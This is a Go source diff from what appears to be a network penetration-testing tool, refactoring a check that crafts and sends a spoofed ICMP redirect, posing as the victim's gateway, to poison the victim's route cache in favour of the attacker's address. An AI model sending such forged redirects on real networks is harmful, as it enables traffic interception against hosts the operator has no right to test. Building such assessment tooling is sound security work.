@@ -18,8 +18,7 @@ import (
 	"github.com/gopacket/gopacket/layers"
 
 	"go.aledante.io/FlowSeer/src/common/errs"
-
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
 )
 
 type icmpRedirectFinding struct {
@@ -29,40 +28,46 @@ type icmpRedirectFinding struct {
 	Redirect string `json:"redirect"`
 }
 
-// RunICMPRedirect sends ICMP redirect messages to poison the victim's
-// route cache. The attacker claims to be the gateway redirecting traffic
-// to itself.
-func RunICMPRedirect(ctx context.Context, deps runner.Deps) error {
-	src := srcMAC()
-	srcGW := gwIP
-	dstVictim := victimIP
-	redirectGW := net.IPv4(10, 0, 0, 99) // attacker's IP
+// RunICMPRedirect sends one redirect to the target's victim, spoofed from
+// the target's gateway, naming the attack leg's own IPv4 as the better
+// hop. The quoted datagram's destination is probe content. The verdict is
+// pending: whether the victim's route cache took the redirect needs a
+// probe that phase 2 adds.
+func RunICMPRedirect(ctx context.Context, deps check.Deps) (check.Verdict, error) {
+	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC, check.FieldGateway); err != nil {
+		return check.Verdict{}, err
+	}
+	addr := deps.AttackLeg.Addr()
+	srcGW := deps.Target.Gateway.IP
+	victim := deps.Target.Victim
+	redirectGW := addr.IPv4
 	origDst := net.IPv4(8, 8, 8, 8)
 
-	pkt, err := craftICMPRedirect(src, srcGW, dstVictim, redirectGW, origDst)
+	pkt, err := craftICMPRedirect(addr.MAC, victim, srcGW, redirectGW, origDst)
 	if err != nil {
-		return errs.Wrap(err, "icmpredirect: craft redirect")
+		return check.Verdict{}, errs.Wrap(err, "icmpredirect: craft redirect")
 	}
 	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
-		return errs.Wrap(err, "icmpredirect: send redirect")
+		return check.Verdict{}, errs.Wrap(err, "icmpredirect: send redirect")
 	}
 
 	detail, _ := json.Marshal(icmpRedirectFinding{
 		Action:   "icmp-redirect",
 		Gateway:  srcGW.String(),
-		Targets:  dstVictim.String(),
+		Targets:  victim.IP.String(),
 		Redirect: redirectGW.String(),
 	})
 	deps.Emitter.Finding("icmp", detail)
 
-	return nil
+	return check.Pending("no observable: route cache acceptance needs a probe of the victim"), nil
 }
 
 // craftICMPRedirect builds an ICMP redirect: Ethernet → IPv4 → ICMP(type=5,
 // code=1) → redirect gateway + original datagram.
-func craftICMPRedirect(src net.HardwareAddr, srcGW, dstVictim, redirectGW, origDst net.IP) ([]byte, error) {
+func craftICMPRedirect(src net.HardwareAddr, victim check.Host, srcGW, redirectGW, origDst net.IP) ([]byte, error) {
+	dstVictim := victim.IP
 	eth := &layers.Ethernet{
-		DstMAC:       victimMAC,
+		DstMAC:       victim.MAC,
 		SrcMAC:       src,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
